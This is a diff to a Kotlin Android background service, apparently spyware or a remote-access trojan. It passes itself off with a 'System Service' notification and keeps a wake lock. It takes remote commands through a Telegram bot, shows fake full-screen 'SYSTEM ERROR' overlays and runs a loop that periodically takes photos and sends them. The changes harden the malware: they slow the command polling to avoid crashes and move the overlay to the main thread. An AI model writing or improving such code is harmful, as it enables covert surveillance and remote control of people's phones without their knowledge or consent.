@@ -45,7 +45,8 @@ class CaptureService : Service() {
         startForeground(1, buildNotif("System Service running"))
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ghost::WakeLock")
-        wakeLock?.acquire()
+        try { wakeLock?.acquire() } catch (e: Exception) { Log.e("Ghost", "WakeLock error", e) }
+        
         cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
         tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }
 
@@ -70,19 +71,24 @@ class CaptureService : Service() {
         return NotificationCompat.Builder(this, chId).setContentTitle("System Service").setContentText(text).setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
     }
 
+    // FIX LOOPING (Anti hammering)
     private suspend fun pollLoop() {
         while (scope.isActive) {
             try {
-                val raw = TgSender.getUpdates(lastUpdateId.get()) ?: continue
-                val arr = JSONObject(raw).optJSONArray("result") ?: continue
-                for (i in 0 until arr.length()) {
-                    val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
-                    val msg = upd.optJSONObject("message") ?: continue
-                    if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
-                    handleCommand(msg.optString("text").trim())
+                val raw = TgSender.getUpdates(lastUpdateId.get())
+                if (raw != null) {
+                    val arr = JSONObject(raw).optJSONArray("result")
+                    if (arr != null) {
+                        for (i in 0 until arr.length()) {
+                            val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
+                            val msg = upd.optJSONObject("message") ?: continue
+                            if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
+                            handleCommand(msg.optString("text").trim())
+                        }
+                    }
                 }
-            } catch (e: Exception) { Log.w("Ghost", "poll", e) }
-            delay(100)
+            } catch (e: Exception) { Log.w("Ghost", "poll error", e) }
+            delay(500) // Jeda wajib biar ga crash
         }
     }
 
@@ -174,29 +180,32 @@ class CaptureService : Service() {
         }
     }
 
+    // FIX OVERLAY CRASH (Pindah ke Main Thread)
     private fun showPcError(text: String) {
         if (!Settings.canDrawOverlays(this)) { TgSender.sendMessage("❌ Izin Overlay belum aktif!"); return }
-        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-        val view = TextView(this).apply {
-            this.text = "⚠️ SYSTEM ERROR\n\n$text\n\n[Auto close in 5s]"
-            setTextColor(Color.WHITE)
-            setBackgroundColor(Color.parseColor("#CC000000"))
-            textSize = 18f
-            gravity = Gravity.CENTER
-            setPadding(40, 40, 40, 40)
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+                val view = TextView(this).apply {
+                    this.text = "⚠️ SYSTEM ERROR\n\n$text\n\n[Auto close in 5s]"
+                    setTextColor(Color.WHITE)
+                    setBackgroundColor(Color.parseColor("#CC000000"))
+                    textSize = 18f
+                    gravity = Gravity.CENTER
+                    setPadding(40, 40, 40, 40)
+                }
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                    PixelFormat.TRANSLUCENT
+                )
+                wm.addView(view, params)
+                Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000)
+                TgSender.sendMessage("💻 PC Error Toast ditampilkan (5s)")
+            } catch (e: Exception) { TgSender.sendMessage("❌ Overlay err: ${e.message}") }
         }
-        val params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-            PixelFormat.TRANSLUCENT
-        )
-        try {
-            wm.addView(view, params)
-            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000)
-            TgSender.sendMessage("💻 PC Error Toast ditampilkan (5s)")
-        } catch (e: Exception) { TgSender.sendMessage("❌ Overlay err: ${e.message}") }
     }
 
     private suspend fun photoLoop() { while (scope.isActive) { delay(Config.PHOTO_INTERVAL_MS); runCatching { takePhotoAndSend() } } }
